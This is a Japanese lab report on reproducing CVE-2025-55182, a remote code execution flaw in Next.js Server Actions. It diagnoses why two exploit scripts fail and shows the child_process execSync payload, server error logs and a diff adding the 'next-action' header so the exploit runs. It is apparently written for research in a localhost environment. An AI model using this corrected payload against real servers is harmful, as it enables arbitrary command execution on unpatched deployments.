# エクスプロイト分析レポート

**作成日**: 2025-12-11
**目的**: CVE-2025-55182 エクスプロイトコードの動作確認と問題分析

## 概要

CVE-2025-55182 (React2Shell) の検証環境において、2つのエクスプロイトスクリプトの動作を確認し、POSTデータの問題点を特定しました。

## 調査結果

### エクスプロイトスクリプトの比較

| スクリプト | next-action ヘッダー | ペイロード形式 | 動作結果 |
|-----------|---------------------|--------------|----------|
| `exploit-official-poc.js` | ✅ あり (`'1'`) | ❌ `require()` 使用 | ⚠️ Server Action実行されるが、`require is not defined`エラー |
| `exploit-sample.js` | ❌ なし | ✅ `import()` 使用 | ❌ HTMLページが返される（Server Actionとして認識されない） |

### 問題点の詳細

#### 1. exploit-sample.js の問題

**症状**:
- POSTリクエストを送信してもHTMLページが返される
- Server Actionが呼び出されない

**原因**:
- `next-action`ヘッダーが設定されていない
- Next.js 15のServer Actionsシステムでは、このヘッダーがないとリクエストが通常のページリクエストとして処理される

**コード（doc/exploit-sample.js:30-34）**:
```javascript
const response = await fetch('http://localhost:3000', {
  method: 'POST',
  body: formData,  // ❌ next-actionヘッダーがない
})
```

**サーバーログ**:
```
POST / 200 in 3434ms
```
→ 200ステータス = 正常なページレスポンス（エクスプロイト失敗）

#### 2. exploit-official-poc.js の問題

**症状**:
- Server Actionは実行されるが、`ReferenceError: require is not defined`が発生
- 500エラーが返される

**原因**:
- ペイロードが`require('child_process')`を使用している
- Next.js 15はESMモジュールシステムを使用しており、`require()`は利用できない

**コード（doc/exploit-official-poc.js:21）**:
```javascript
_prefix: `require('child_process').execSync('${command}').toString()//`,  // ❌ requireは使用不可
```

**サーバーログ**:
```
POST / 500 in 32ms
⨯ Internal error: ReferenceError: require is not defined
    at Object.eval [as then] (eval at <anonymous> ...)
```
→ **重要**: `eval`が実行されている = 脆弱性が存在することを証明

**詳細なエラースタック**:
```
digest: "1784486956"
    at Object.eval [as then] (eval at <anonymous> (/home/user/home-lab-rotten-next/node_modules/.pnpm/next@15.0.0_react-dom@19.0.0_react@19.0.0__react@19.0.0/node_modules/next/dist/compiled/next-server/app-page.runtime.dev.js:122:66669), <anonymous>:3:1)
```

## 脆弱性の確認

### exploit-official-poc.js の実行結果

**リクエスト**:
```bash
node doc/exploit-official-poc.js http://localhost:3000 id
```

**レスポンス**:
```
[*] Targeting: http://localhost:3000
[*] Command: id
[*] Sending payload...

[+] Response:
0:{"a":"$@1","f":"","b":"development"}
1:E{"digest":"1784486956","message":"require is not defined","stack":[],"env":"Server"}
```

**解析**:
1. `next-action: '1'`ヘッダーによりServer Actionとして処理された ✅
2. RSC Flightプロトコルでペイロードがデシリアライズされた ✅
3. `eval`が実行され、任意のコードが処理された ✅ **← 脆弱性の存在を証明**
4. しかし、`require()`が使用できないためエラーが発生 ❌

### 脆弱性の確認ポイント

1. **任意のコード実行が可能**: エラーメッセージの`at Object.eval [as then]`は、ペイロードのコードが実行されたことを示す
2. **デシリアライズ脆弱性**: RSCのFlightプロトコルが悪意のあるペイロードを処理している
3. **CVE-2025-55182が再現可能**: Next.js 15.0.0 + react-server-dom-webpack 19.0.0の組み合わせで脆弱性が存在

## 技術的詳細

### POSTリクエストの正しい形式

Next.js 15のServer Actionsを呼び出すには：

```javascript
const response = await fetch(targetUrl, {
  method: 'POST',
  headers: {
    'next-action': '1'  // ← 必須ヘッダー
  },
  body: formData
})
```

### ESM環境でのモジュールインポート

Next.js 15では`import()`を使用する必要がある：

**✅ 正しい形式** (exploit-sample.js):
```javascript
return import('child_process').then(cp => {
  const output = cp.execSync(cmd).toString();
  return output;
});
```

**❌ 誤った形式** (exploit-official-poc.js):
```javascript
require('child_process').execSync('${command}').toString()
```

## まとめ

### 発見事項

1. **脆弱性の存在確認**: ✅
   - CVE-2025-55182が実際に再現可能であることを確認
   - `eval`が実行され、任意のコードが処理されている

2. **両方のエクスプロイトスクリプトに問題あり**: ⚠️
   - `exploit-official-poc.js`: ヘッダーは正しいが、ペイロードが古い
   - `exploit-sample.js`: ペイロードは正しいが、ヘッダーがない

3. **POSTデータの問題点**:
   - `next-action`ヘッダーの欠如（exploit-sample.js）
   - `require()`の使用（exploit-official-poc.js）

### 推奨事項

#### テストスクリプトの修正提案

**優先度 高**: `exploit-sample.js`に`next-action`ヘッダーを追加

```diff
  const response = await fetch('http://localhost:3000', {
    method: 'POST',
+   headers: {
+     'next-action': '1'
+   },
    body: formData,
  })
```

この変更により：
- ✅ Server Actionとして認識される
- ✅ ESM環境で動作する正しいペイロード（`import()`使用）
- ✅ RCEが成功する（予想）

#### セキュリティ上の注意

⚠️ **警告**: この修正により、実際にOSコマンドが実行されるようになります。

- ローカル環境（localhost）でのみテストすること
- 外部ネットワークには公開しないこと
- テストコマンドは安全なもの（`id`, `whoami`, `pwd`等）に限定すること

## 次のステップ

1. ✅ **脆弱性の確認**: 完了（このレポートで証明）
2. ⏳ **エクスプロイトの修正**: `exploit-sample.js`に`next-action`ヘッダーを追加（推奨）
3. ⏳ **完全なRCEテスト**: 修正後に再テスト実行
4. ⏳ **ドキュメント更新**: 検証結果をVERIFICATION_REPORT.mdに追記

---

**補足**: このレポートは教育・研究目的で作成されています。脆弱性の理解と対策方法の学習を目的としています。
